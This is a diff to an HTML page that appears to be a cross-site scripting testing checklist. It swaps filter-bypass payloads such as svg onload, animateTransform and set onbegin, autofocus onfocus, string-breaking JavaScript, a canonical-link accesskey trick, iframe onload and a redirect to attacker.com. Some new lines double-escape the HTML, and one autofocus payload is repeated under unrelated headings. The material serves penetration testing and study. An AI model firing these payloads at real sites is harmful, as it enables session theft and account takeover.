@@ -228,9 +228,7 @@
 
 <h3>✅ 1. <strong>Test Classic Injection First</strong></h3>
 <ul>
-<li><p>Try:</p>
-<pre><code class="language-html">&lt;script&gt;alert(1)&lt;/script&gt;
-</code></pre>
+<li><p>Try: Normal Vectors like script and img</p>
 </li>
 <li><p>If blocked → move to bypasses.</p>
 </li>
@@ -245,12 +243,14 @@
 <h3>🔄 2. <strong>Tag Filtering? → Use Allowed Tags (e.g. <code>&lt;svg&gt;</code>, <code>&lt;math&gt;</code>, etc.)</strong></h3>
 <ul>
 <li><p>Try allowed tags with events:</p>
-<pre><code class="language-html">&lt;svg onload=alert(1)&gt;
-&lt;svg&gt;&lt;animateTransform onbegin=alert(1)&gt;
+<pre><code class="language-html">
+  &amp;lt;svg onload=alert(2)&amp;gt;
+  &amp;lt;svg&amp;gt;&amp;lt;animateTransform onbegin=alert(3)&amp;gt;
 </code></pre>
 </li>
 <li><p>If attributes are stripped → try payloads <em>without quotes</em> or use unusual events:</p>
-<pre><code class="language-html">&lt;svg&gt;&lt;set attributeName=&quot;x&quot; to=&quot;1&quot; onbegin=alert(1)&gt;
+<pre><code class="language-html">
+  &amp;lt;svg&amp;gt;&amp;lt;set attributeName=&amp;quot;x&amp;quot; to=&amp;quot;1&amp;quot; onbegin=alert(4)&amp;gt;
 </code></pre>
 </li>
 </ul>
@@ -283,7 +283,8 @@
 </ul>
 </li>
 <li><p>No quotes? → Use <strong>unquoted attributes</strong>:</p>
-<pre><code class="language-html">&lt;img src=x onerror=alert(1)&gt;
+<pre><code class="language-html">
+  &amp;lt;input autofocus onfocus=alert(14) tabindex=1&amp;gt;
 </code></pre>
 </li>
 </ul>
@@ -299,12 +300,12 @@
 <h3>📉 4. <strong>Input Ends Up Inside a String? → Break It!</strong></h3>
 <ul>
 <li><p>Try to <strong>terminate the string</strong>:</p>
-<pre><code class="language-js">&#39;);alert(1);//
-&quot;);alert(1);// 
+<pre><code class="language-js">&#39;);alert(6);//
+&quot;);alert(7);// 
 </code></pre>
 </li>
 <li><p>If <code>&#39;</code> is blocked → use backtick or template string injection:</p>
-<pre><code class="language-js">${alert(1)}
+<pre><code class="language-js">${alert(8)}
 </code></pre>
 </li>
 </ul>
@@ -322,7 +323,8 @@
 <li><p>If <code>.replace()</code> is only used once:</p>
 <ul>
 <li><p>Payload survives second occurrence</p>
-<pre><code class="language-js">&lt;img src=x onerror=alert(1)&gt;
+<pre><code class="language-html">
+  &amp;lt;input autofocus onfocus=alert(14) tabindex=1&amp;gt;
 </code></pre>
 </li>
 <li><p>Try payloads with multiple characters, only first replaced.</p>
@@ -348,16 +350,17 @@
 </code></pre>
 </li>
 <li><p>Then you pass:</p>
-<pre><code>&#39;?accesskey=&#39;x&#39;onclick=&#39;alert(1)
+<pre><code>&#39;?accesskey=&#39;x&#39;onclick=&#39;alert(10)
 </code></pre>
 <p>→ Browser treats it as malformed HTML and auto-completes it like:</p>
-<pre><code class="language-html">&lt;link rel=&quot;canonical&quot; href=&quot;?&quot; accesskey=&quot;x&quot; onclick=&quot;alert(1)&quot;&gt;
+<pre><code class="language-html">&lt;link rel=&quot;canonical&quot; href=&quot;?&quot; accesskey=&quot;x&quot; onclick=&quot;alert(15)&quot;&gt;
 </code></pre>
 </li>
 </ul>
 </li>
 <li><p>🧠 Test this by injecting <code>&gt;</code> to prematurely break tags:</p>
-<pre><code class="language-html">&quot;&gt;&lt;svg onload=alert(1)&gt;
+<pre><code class="language-html">
+  &amp;lt;input autofocus onfocus=alert(14) tabindex=1&amp;gt;
 </code></pre>
 </li>
 </ul>
@@ -383,7 +386,7 @@
 <ul>
 <li><p>If input is reflected into JS, try:</p>
 <pre><code class="language-js">location = &quot;https://attacker.com&quot;
-alert(1)
+alert(12)
 </code></pre>
 </li>
 <li><p>Dangerous sinks:</p>
@@ -407,7 +410,8 @@ alert(1)
 <h3>🎯 9. <strong>Use iframe + Event Handlers</strong></h3>
 <ul>
 <li><p>Works well if embedding is possible:</p>
-<pre><code class="language-html">&lt;iframe src=&quot;evil.html&quot; onload=alert(1)&gt;
+<pre><code class="language-html">
+  &amp;lt;iframe src=&amp;quot;evil.html&amp;quot; onload=alert(13)&amp;gt;
 </code></pre>
 </li>
 </ul>
@@ -431,7 +435,8 @@ alert(1)
 </ul>
 </li>
 <li><p>Use <code>tabindex=1</code> to <strong>auto-trigger <code>onfocus</code></strong>:</p>
-<pre><code class="language-html">&lt;input autofocus onfocus=alert(1) tabindex=1&gt;
+<pre><code class="language-html">
+  &amp;lt;input autofocus onfocus=alert(14) tabindex=1&amp;gt;
 </code></pre>
 </li>
 </ul>
